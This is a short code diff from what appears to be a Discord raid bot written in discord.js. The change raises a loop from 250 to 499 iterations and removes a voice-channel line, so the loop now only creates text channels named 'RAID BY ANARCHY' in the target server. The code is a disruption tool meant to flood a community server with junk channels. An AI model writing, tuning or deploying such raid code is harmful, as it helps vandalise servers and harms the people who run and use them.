@@ -10,8 +10,8 @@ const Discord = require('discord.js');
                     color: 'RED',
                 });
               }
-                for (var i = 0; i < 250; i++) {
-                message.guild.createChannel('RAID BY ANARCHY', 'voice')
+                for (var i = 0; i < 499; i++) {
+               
                 message.guild.createChannel('RAID BY ANARCHY', 'text')
     
           
